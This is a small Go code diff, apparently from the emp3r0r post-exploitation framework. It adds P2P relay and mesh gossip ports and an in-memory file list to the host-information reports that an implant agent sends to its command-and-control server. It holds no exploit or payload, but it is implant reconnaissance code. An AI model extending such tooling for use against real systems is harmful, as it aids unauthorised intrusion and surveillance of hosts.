@@ -72,6 +72,10 @@ func GatherSystemDetails() *def.Emp3r0rAgent {
 	info.Container = "N/A" // sysinfo.CheckContainer() might be light, but skipping for minimal
 	info.Transport = genC2TransportString()
 	def.Transport = info.Transport
+	info.P2PRelayPort = common.RuntimeConfig.P2PRelayPort
+	info.MeshGossipPort = common.RuntimeConfig.MeshGossipPort
+	info.Files = util.ListMemFiles()
+
 	if common.RuntimeConfig.IsP2PEnabled {
 		if common.RuntimeConfig.IsDirectC2Enabled {
 			info.MeshRoute = "gateway"
@@ -172,6 +176,9 @@ func CollectFullSystemInfo() *def.Emp3r0rAgent {
 	info.Container = sysinfo.CheckContainer()
 	info.Transport = genC2TransportString()
 	def.Transport = info.Transport
+	info.P2PRelayPort = common.RuntimeConfig.P2PRelayPort
+	info.MeshGossipPort = common.RuntimeConfig.MeshGossipPort
+	info.Files = util.ListMemFiles()
 
 	// have root?
 	info.HasRoot = sysinfo.HasRoot()
